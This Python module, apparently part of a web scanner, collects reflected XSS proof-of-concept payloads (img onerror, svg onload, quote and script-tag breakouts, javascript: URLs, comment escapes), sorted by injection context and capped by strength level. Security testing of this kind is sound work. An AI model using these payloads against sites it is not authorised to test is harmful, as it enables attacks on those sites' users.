"""
Reflected XSS 전용 페이로드 모음.
context 분류:
  body          : HTML body 직접 삽입 (html_text)
  attr_value    : value="" / name="" 속성값 내부
  script        : <script> 블록 내부 JS 문자열 (script_string)
  attr_href     : href / src / action 등 URL 속성 (url_attribute)
  html_comment  : HTML 주석 내부

Stored XSS, DOM XSS, Open Redirect, Template payload 제외.
"""

from typing import Dict, List

Payload = Dict[str, str]

STRENGTH_LIMIT = {
    "LOW":    4,
    "MEDIUM": 10,
    "HIGH":   25,
    "INSANE": 9999,
}

# ── 1. BODY (html_text) — HTML body 직접 삽입 ───────────────────────
BODY: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "img_onerror",     "payload": "<img src=x onerror=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "svg_onload",      "payload": "<svg/onload=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "script_tag",      "payload": "<script>alert(1)</script>"},
    {"type": "REFLECTED_XSS", "family": "input_autofocus", "payload": "<input autofocus onfocus=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "details_toggle",  "payload": "<details open ontoggle=alert(1)>"},
    {"type": "REFLECTED_XSS", "family": "img_backtick",    "payload": "<img src=x onerror=alert`1`>"},
    {"type": "REFLECTED_XSS", "family": "iframe_js",       "payload": '<iframe src="javascript:alert(1)">'},
]

# ── 2. ATTR_VALUE — value="" / name="" 속성 탈출 ────────────────────
ATTR_VALUE: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "dq_img_onerror",  "payload": '"><img src=x onerror=alert(1)>'},
    {"type": "REFLECTED_XSS", "family": "dq_svg_onload",   "payload": '"><svg onload=alert(1)>'},
    {"type": "REFLECTED_XSS", "family": "dq_onmouseover",  "payload": '" onmouseover=alert(1) x="'},
    {"type": "REFLECTED_XSS", "family": "dq_onfocus_auto", "payload": '" autofocus onfocus=alert(1) x="'},
    {"type": "REFLECTED_XSS", "family": "sq_img_onerror",  "payload": "'><img src=x onerror=alert(1)>"},
]

# ── 3. SCRIPT_CONTEXT (script_string) — <script> 블록 내 문자열 탈출 ─
SCRIPT_CONTEXT: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "sc_sq_break",     "payload": "';alert(1);//"},
    {"type": "REFLECTED_XSS", "family": "sc_dq_break",     "payload": '";alert(1);//'},
    {"type": "REFLECTED_XSS", "family": "sc_close_reopen", "payload": "</script><script>alert(1)</script>"},
    {"type": "REFLECTED_XSS", "family": "sc_close_img",    "payload": "</script><img src=x onerror=alert(1)>"},
]

# ── 4. ATTR_HREF (url_attribute) — href/src/action 등 URL 속성 ──────
ATTR_HREF: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "js_protocol",     "payload": "javascript:alert(1)"},
    {"type": "REFLECTED_XSS", "family": "js_protocol_caps","payload": "JavaScript:alert(1)"},
    {"type": "REFLECTED_XSS", "family": "data_html",       "payload": "data:text/html,<script>alert(1)</script>"},
    {"type": "REFLECTED_XSS", "family": "attr_break",      "payload": '" onmouseover=alert(1) href="#'},
]

# ── 5. HTML_COMMENT — <!-- USER --> 주석 탈출 ───────────────────────
HTML_COMMENT: List[Payload] = [
    {"type": "REFLECTED_XSS", "family": "cmt_img",         "payload": "--><img src=x onerror=alert(1)><!--"},
    {"type": "REFLECTED_XSS", "family": "cmt_svg",         "payload": "--><svg onload=alert(1)><!--"},
    {"type": "REFLECTED_XSS", "family": "cmt_script",      "payload": "--><script>alert(1)</script><!--"},
]


# ── 헬퍼 ────────────────────────────────────────────────────────────

def _limit(payloads: List[Payload], strength: str) -> List[Payload]:
    return payloads[: STRENGTH_LIMIT.get(strength.upper(), STRENGTH_LIMIT["MEDIUM"])]


def _dedupe(groups: List[List[Payload]]) -> List[Payload]:
    seen: set = set()
    result: List[Payload] = []
    for group in groups:
        for item in group:
            if item["payload"] not in seen:
                seen.add(item["payload"])
                result.append(item)
    return result


# ── context 맵 ──────────────────────────────────────────────────────
# strategy.py의 _XSS_REFLECTED_CONTEXTS = ("body", "attr_value", "script", "attr_href", "html_comment")와 일치
CONTEXT_MAP: Dict[str, List[Payload]] = {
    "body":         BODY,
    "html_text":    BODY,           # alias
    "attr_value":   ATTR_VALUE,
    "script":       SCRIPT_CONTEXT,
    "script_string":SCRIPT_CONTEXT, # alias
    "attr_href":    ATTR_HREF,
    "url_attribute":ATTR_HREF,      # alias
    "html_comment": HTML_COMMENT,
    # 제거된 컨텍스트에 대한 fallback — generator.py 호환
    "reflected":    _dedupe([ATTR_VALUE, BODY, SCRIPT_CONTEXT]),
    "unknown":      _dedupe([BODY, ATTR_VALUE]),
}


def get_by_context(context: str, strength: str = "MEDIUM") -> List[Payload]:
    """컨텍스트 이름으로 페이로드 반환 (강도 제한 적용). 없으면 BODY로 fallback."""
    payloads = CONTEXT_MAP.get(context.lower(), BODY)
    return _limit(payloads, strength)


def get_all() -> List[Payload]:
    """Reflected XSS 전체 페이로드 중복 제거 후 반환."""
    return _dedupe([BODY, ATTR_VALUE, SCRIPT_CONTEXT, ATTR_HREF, HTML_COMMENT])


if __name__ == "__main__":
    all_payloads = get_all()
    print(f"총 페이로드 수: {len(all_payloads)}")
    for ctx in ("body", "attr_value", "script", "attr_href", "html_comment"):
        print(f"\n[{ctx}]")
        for p in get_by_context(ctx, "INSANE"):
            print(f"  [{p['family']}] {p['payload']}")
